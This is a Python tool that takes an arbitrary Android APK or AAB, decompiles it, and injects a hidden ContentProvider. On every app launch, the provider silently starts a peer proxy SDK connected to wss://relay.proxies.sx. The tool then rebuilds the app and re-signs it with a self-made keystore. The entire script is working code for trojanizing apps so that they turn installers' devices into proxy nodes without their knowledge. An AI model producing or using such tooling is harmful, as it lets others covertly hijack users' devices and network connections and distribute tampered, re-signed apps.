import sys
import os
import shutil
import zipfile
import subprocess
import tempfile
import re

from androguard.core.bytecodes.dvm import DalvikVMFormat

def get_sdk_signatures(dex_path):
    print(f"[*] Analyzing {dex_path} to find SDK signatures...")
    try:
        with open(dex_path, 'rb') as f:
            dex_data = f.read()
        dvm = DalvikVMFormat(dex_data)
        
        sdk_class = None
        peer_config_class = None
        
        for cls in dvm.get_classes():
            cls_name = cls.get_name()[1:-1].replace('/', '.')
            if 'ProxiesPeerSDK' in cls_name or 'PeerSDK' in cls_name:
                sdk_class = cls.get_name()
            if 'PeerConfig' in cls_name or 'ProxyConfig' in cls_name:
                peer_config_class = cls.get_name()
                
        if not sdk_class or not peer_config_class:
            print("[-] Could not automatically find SDK classes. Using default...")
            sdk_class = "Lcom/proxies/sdk/ProxiesPeerSDK;"
            peer_config_class = "Lcom/proxies/sdk/PeerConfig;"
            
        print(f"[*] Found SDK Class: {sdk_class}")
        print(f"[*] Found Config Class: {peer_config_class}")
        return sdk_class, peer_config_class
    except Exception as e:
        print(f"[-] Error analyzing DEX: {e}")
        return "Lcom/proxies/sdk/ProxiesPeerSDK;", "Lcom/proxies/sdk/PeerConfig;"

def generate_smali_provider(sdk_class, peer_config_class, api_key):
    smali_code = f""".class public Lcom/zealot/proxy/ZealotProxyProvider;
.super Landroid/content/ContentProvider;

.method public constructor <init>()V
    .registers 1
    invoke-direct {{p0}}, Landroid/content/ContentProvider;-><init>()V
    return-void
.end method

.method public callStartup()V
    .registers 5

    # Get Context
    invoke-virtual {{p0}}, Lcom/zealot/proxy/ZealotProxyProvider;->getContext()Landroid/content/Context;
    move-result-object v1

    # Create PeerConfig (Kotlin data class requires String constructor for relayUrl)
    new-instance v2, {peer_config_class}
    const-string v3, "wss://relay.proxies.sx"
    invoke-direct {{v2, v3}}, {peer_config_class};-><init>(Ljava/lang/String;)V

    # Call ProxiesPeerSDK.init(Context, String, PeerConfig)
    const-string v3, "{api_key}"
    invoke-static {{v1, v3, v2}}, {sdk_class};->init(Landroid/content/Context;Ljava/lang/String;{peer_config_class};)V

    # Call ProxiesPeerSDK.getInstance().start()
    invoke-static {{}}, {sdk_class};->getInstance()Lcom/proxies/sdk/ProxiesPeerSDK;
    move-result-object v4
    invoke-virtual {{v4}}, {sdk_class};->start()V

    return-void
.end method

.method public onCreate()Z
    .registers 2
    invoke-virtual {{p0}}, Lcom/zealot/proxy/ZealotProxyProvider;->callStartup()V
    const/4 v0, 0x1
    return v0
.end method

.method public query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    .registers 7
    const/4 v0, 0x0
    return-object v0
.end method

.method public getType(Landroid/net/Uri;)Ljava/lang/String;
    .registers 2
    const/4 v0, 0x0
    return-object v0
.end method

.method public insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;
    .registers 3
    const/4 v0, 0x0
    return-object v0
.end method

.method public delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    .registers 6
    const/4 v0, 0x0
    return v0
.end method

.method public update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I
    .registers 6
    const/4 v0, 0x0
    return v0
.end method
"""
    return smali_code

def patch(input_file, output_file, sdk_dex_path, api_key):
    ext = input_file.split('.')[-1].lower()
    work_dir = tempfile.mkdtemp()
    target_apk = input_file

    keystore = os.path.expanduser('~/.zealot/debug.keystore')
    if not os.path.exists(keystore):
        os.makedirs(os.path.dirname(keystore), exist_ok=True)
        print("[*] Generating Zealot signing keystore...")
        subprocess.run([
            'keytool', '-genkeypair', '-alias', 'androiddebugkey',
            '-keypass', 'android', '-keystore', keystore,
            '-storepass', 'android', '-keyalg', 'RSA', '-keysize', '2048',
            '-validity', '10000', '-dname', 'CN=ZealotProxy,O=Zealot,C=US'
        ], check=True)

    try:
        if ext == 'aab':
            print(f"[*] Converting AAB to Universal APK using bundletool...")
            apks_file = os.path.join(work_dir, "universal.apks")
            subprocess.run([
                'java', '-jar', '/usr/local/bin/bundletool.jar', 'build-apks',
                '--bundle', input_file,
                '--output', apks_file,
                '--mode', 'universal'
            ], check=True)
            
            apk_extract_dir = os.path.join(work_dir, "apk_extract")
            os.makedirs(apk_extract_dir, exist_ok=True)
            with zipfile.ZipFile(apks_file, 'r') as z:
                z.extractall(apk_extract_dir)
                
            for root, _, files in os.walk(apk_extract_dir):
                for f in files:
                    if f.endswith('.apk'):
                        target_apk = os.path.join(root, f)
                        break
            ext = 'apk'

        if ext == 'apk':
            print(f"[*] Decompiling APK: {target_apk}...")
            app_dir = os.path.join(work_dir, "app")
            subprocess.run(['apktool', 'd', '-f', target_apk, '-o', app_dir], check=True)
            
            manifest = os.path.join(app_dir, 'AndroidManifest.xml')
            with open(manifest, 'r') as f: data = f.read()
            
            perms = '<uses-permission android:name="android.permission.INTERNET"/>\n<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>\n<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n'
            provider = '<provider android:name="com.zealot.proxy.ZealotProxyProvider" android:authorities="${applicationId}.zealot-proxy" android:exported="false"/>'
            
            if '<application' in data:
                data = data.replace('<application', perms + '<application', 1)
                data = data.replace('<application', f'<application\n        {provider}', 1)
            with open(manifest, 'w') as f: f.write(data)
            
            sdk_class, peer_config_class = get_sdk_signatures(sdk_dex_path)
            smali_code = generate_smali_provider(sdk_class, peer_config_class, api_key)
            
            smali_dir = os.path.join(app_dir, 'smali', 'com', 'zealot', 'proxy')
            os.makedirs(smali_dir, exist_ok=True)
            with open(os.path.join(smali_dir, 'ZealotProxyProvider.smali'), 'w') as f:
                f.write(smali_code)
            
            print("[*] Recompiling APK with injected Smali hook...")
            subprocess.run(['apktool', 'b', '-o', output_file, app_dir], check=True)
            
            print("[*] Injecting SDK DEX...")
            with zipfile.ZipFile(output_file, 'a') as z:
                z.write(sdk_dex_path, 'classes2.dex')
                
            print("[*] Signing APK with apksigner (V1 & V2)...")
            subprocess.run([
                'java', '-jar', '/usr/local/bin/apksigner.jar', 'sign',
                '--ks', keystore,
                '--ks-pass', 'pass:android',
                '--ks-key-alias', 'androiddebugkey',
                '--key-pass', 'pass:android',
                '--v1-signing-enabled', 'true',
                '--v2-signing-enabled', 'true',
                output_file
            ], check=True)
            return True
        else:
            print(f"[-] Unsupported file type: {ext}")
            return False
    except Exception as e:
        print(f"[-] Error during patching: {e}")
        import traceback
        traceback.print_exc()
        return False
    finally:
        shutil.rmtree(work_dir, ignore_errors=True)

if __name__ == '__main__':
    if len(sys.argv) != 5:
        print("Usage: python3 proxy_sdk_patcher.py <input> <output> <sdk_dex> <api_key>")
        sys.exit(1)
    success = patch(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
    sys.exit(0 if success else 1)
